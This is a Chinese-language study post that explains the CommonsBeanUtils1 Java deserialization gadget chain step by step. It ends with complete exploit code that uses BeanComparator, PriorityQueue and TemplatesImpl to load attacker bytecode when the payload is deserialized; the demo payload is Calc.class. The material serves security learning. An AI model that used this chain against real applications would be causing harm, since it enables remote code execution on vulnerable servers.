---
title: Java 反序列化之 CommonsBeanUtils1 反序列化
date: 2025-9-30 21:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

## 前言

因为后续的漏洞利用当中，CommonsBeanUtils 这一条链子还是比较重要的，不论是 shiro 还是后续的 fastjson，都是比较有必要学习的。

在已经学习一些基础知识与 CC 链的情况下，最终链子就可以自己跟着 yso 的链子利用走一遍写 EXP 了

## 环境搭建

jdk8 不受版本影响均可
其余环境如下所示

```xml
<dependency>  
 <groupId>commons-beanutils</groupId>  
 <artifactId>commons-beanutils</artifactId>  
 <version>1.9.2</version>  
</dependency>  
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->  
<dependency>  
 <groupId>commons-collections</groupId>  
 <artifactId>commons-collections</artifactId>  
 <version>3.1</version>  
</dependency>  
<!-- https://mvnrepository.com/artifact/commons-logging/commons-logging -->  
<dependency>  
 <groupId>commons-logging</groupId>  
 <artifactId>commons-logging</artifactId>  
 <version>1.2</version>  
</dependency>
```

## JavaBean

`JavaBean`我简单通俗理解就是类的`getxxx方法`和`setxxx方法`，一个是用来获取值，一个是用来设置值

`Commons-BeanUtils` 中提供了一个静态方法 `PropertyUtils.getProperty` ，让使用者可以直接调用任意 `JavaBean` 的 `getxxx方法`

```java
package org.example;

import org.apache.commons.beanutils.PropertyUtils;

public class commonsbean {
        public static class A{
        private String name = "aaa";

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }
    }
    public static void main(String[] args) throws Exception {
        System.out.println(PropertyUtils.getProperty(new A(), "name"));
    }
}
```

通过`PropertyUtils.getProperty`方法就可以直接调用`getxxx`方法

# CommonsBeanUtils1 链子分析

## 调用链

![image-20250930204857564](./Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%20CommonsBeanUtils1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930204857564.png)

## 链子尾部-TemplatesImpl动态加载字节码

我们链子的尾部是通过动态加载 TemplatesImpl 字节码的方式进行攻击的

之前CC链是到`newTransformer`然后去找别的方法了，同名类下还有`getOutputProperties`调用了`newTransformer()`，这就是一个getter方法，可以通过`PropertyUtils.getProperty`去调用

![image-20250930203550905](./Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%20CommonsBeanUtils1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930203550905.png)

```
PropertyUtils.getProperty(TemplatesImpl,OutputProperties);
```

后半段代码如下

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.PropertyUtils;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class commonsbean {
    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setfieldvalue(templates,"_name","a");
        setfieldvalue(templates,"_bytecodes",new byte[][]{code});
        setfieldvalue(templates,"_tfactory",new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());
//        templates.getOutputProperties();
        PropertyUtils.getProperty(templates,"outputProperties");
    }
    public static void setfieldvalue(Object obj,String fieldname,Object Value) throws Exception{
        Class c = obj.getClass();
        Field field = c.getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,Value);
    }

}
```

## 链子头部-CC4链

接下来去找哪个调用了`getProperty`方法，找到`BeanComparator`中的`compare()`调用了`getProperty()`

![image-20250930204212457](./Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%20CommonsBeanUtils1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930204212457.png)

到了`compare`时就是CC4链的前半段了，全部在`PriorityQueue类`中

![image-20250930204849432](./Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%20CommonsBeanUtils1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930204849432.png)

## BeanComparator.compare()调用getProperty()

```java
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setfieldvalue(templates,"_name","a");
        setfieldvalue(templates,"_bytecodes",new byte[][]{code});
        setfieldvalue(templates,"_tfactory",new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());
//        templates.getOutputProperties();
//        PropertyUtils.getProperty(templates,"outputProperties");
        BeanComparator comparator = new BeanComparator("outputProperties",null);
        comparator.compare(templates,templates);
```

## PriorityQueue类执行后续链子

之前CC4链的时候就说过，要进入到`heapify`函数的`for`循环中执行`siftDown`就要`size`大于2，`size>>>1`就是正数除以2的意思，所以要通过`add函数`给数组添加元素

![image-20250930212044441](./Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%20CommonsBeanUtils1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930212044441.png)

但是add时也会调用`compare()`函数，所以在add之前不能让链子完整，等add之后通过反射将上面的值重新赋值为完整的链子，再进行序列化和反序列化

![image-20250928161513481](./Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%20CommonsBeanUtils1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250928161513481.png)

## 完整代码

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;

import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class commonsbean {
    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setfieldvalue(templates,"_name","a");
        setfieldvalue(templates,"_bytecodes",new byte[][]{code});
        setfieldvalue(templates,"_tfactory",new TransformerFactoryImpl());
//        templates.getOutputProperties();
//        PropertyUtils.getProperty(templates,"outputProperties");

        BeanComparator comparator = new BeanComparator();
//        comparator.compare(templates,templates);
        PriorityQueue priorityQueue = new PriorityQueue(2,comparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        setfieldvalue(comparator,"property","outputProperties");
        setfieldvalue(priorityQueue,"queue",new Object[]{templates,templates});
        serialize(priorityQueue);
        unserialize();

    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(Files.newOutputStream(Paths.get("commonsbean.ser")));
        objectOutputStream.writeObject(obj);
    }
    public static void unserialize() throws Exception {
        java.io.ObjectInputStream objectInputStream = new java.io.ObjectInputStream(Files.newInputStream(Paths.get("commonsbean.ser")));
        objectInputStream.readObject();
    }
    public static void setfieldvalue(Object obj,String fieldname,Object Value) throws Exception{
        Class c = obj.getClass();
        Field field = c.getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,Value);
    }

}

```

